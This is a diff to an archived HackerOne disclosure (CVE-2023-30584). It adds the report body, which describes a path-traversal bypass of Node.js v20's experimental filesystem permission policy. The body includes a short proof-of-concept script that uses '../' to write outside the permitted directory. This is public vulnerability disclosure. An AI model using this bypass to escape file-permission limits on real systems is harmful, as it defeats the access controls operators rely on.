@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "Path Traversal"
 enriched: true
+body: true
 date: 2023-07-20
 submitted: 2023-04-18T18:34:13.285Z
 bounty_usd: null
@@ -26,6 +27,27 @@ title: "Filesystem experimental permissions policy does not handle path traversa
 - Report: [https://hackerone.com/reports/1952978](https://hackerone.com/reports/1952978)
 - CWE: Path Traversal | CVE: CVE-2023-30584
 - Submitted: 2023-04-18T18:34:13.285Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Consider the following command on Node v20.0.0:
+```
+node --experimental-permission --allow-fs-read=* --allow-fs-write=/home/kali/restricted/ poc.js
+```
+This command is intended to restrict write access to only files present in the directory /home/kali/restricted
+
+However if we have the following poc.js:
+```
+const fs = module.require('fs')
+fs.writeFileSync("/home/kali/restricted/../secret.txt", "Target Overwritten!")
+```
+This apparently matches the directory /home/kali/restricted/ directory check and then writes to /home/kali/secret.txt (by using ../), which is not intended, bypassing the experimental permission policy for files.
+
+## Impact
+
+Path traversal when checking experimental file permission policy
 
 ## Timeline
 
